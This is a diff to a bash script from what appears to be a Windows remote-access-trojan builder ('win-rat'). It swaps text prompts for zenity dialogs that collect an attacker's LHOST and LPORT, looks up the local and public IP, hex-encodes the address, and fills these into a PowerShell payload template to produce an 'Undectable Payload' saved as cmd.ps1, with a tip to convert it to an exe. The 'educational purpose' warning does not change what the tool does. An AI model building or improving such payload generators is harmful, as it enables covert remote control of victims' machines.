@@ -44,31 +44,45 @@ clear
 sleep 1
 echo -e ${NC} "[*] Checking dependencies configuration \n"
 if [[ "$(ping -c 1 google.com | grep '100% packet loss' )" != "" ]]; then
-  echo -e ${RED} "\n[ X ] Internet.............${GREEN}[ working ]"
+  echo -e ${RED} "\n[ X ] Internet.............${RED}[ Not working ]"
   exit 1
   else
   echo -e ${GREEN} "\n[ ✔ ] Internet.............${GREEN}[ working ]"
   
 fi
 sleep 1
-
-
+which zenity > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e  ${GREEN}"\n[ ✔ ] Zenity..................${GREEN}[ found ]"
+which zenity > /dev/null 2>&1
+sleep 2
+else
+echo -e ${RED}"\n[ X ] Zenity................[ Not Found ]"
+sleep 2
+echo -e ${YELLOW}"\n[ ! ] Installing Zenity \n"
+sleep 1
+sudo apt-get install zenity -y
+clear
+echo -e ${BLUE}"[ ✔ ] Done installing ....\n "
+sleep 2
+which zenity > /dev/null 2>&1
+fi
+addr=`hostname -I`
+pubaddr=`dig +short myip.opendns.com @resolver1.opendns.com`
 function WAN(){
 clear
 banner
-echo -e -n ${BLUE}"\n[+] Enter LHOST: "
-read  lhost
-echo -e -n ${BLUE}"\n[+] Enter LPORT: "
-read port
 
-Hexip=$(printf '%02X' ${lhost//./ } | sed  -e 's/^/0x/')
+LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)
+LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)
+ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
 sleep 2
 echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
 sleep 2
 echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
 sleep 1
 
-cat payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
+cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1
 
 
 sleep 2
@@ -79,19 +93,17 @@ echo -e -n ${RED}"\n[ ✔ ] Tip: Now Convert cmd.ps1 to exe format using ps2exe 
 function LAN(){
 clear
 banner
-echo -e -n ${BLUE}"\n[+] Enter LHOST: "
-read  lhost
-echo -e -n ${BLUE}"\n[+] Enter LPORT: "
-read port
+LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)
 
-Hexip=$(printf '%02X' ${lhost//./ } | sed  -e 's/^/0x/')
+LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)
+
+ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
 sleep 2
 echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
 sleep 2
 echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
 sleep 1
-cat payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
-
+cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1
 
 sleep 2
 echo -e -n ${CP}"\n[ ✔ ] Payload saved as /win-rat/cmd.ps1 \n "
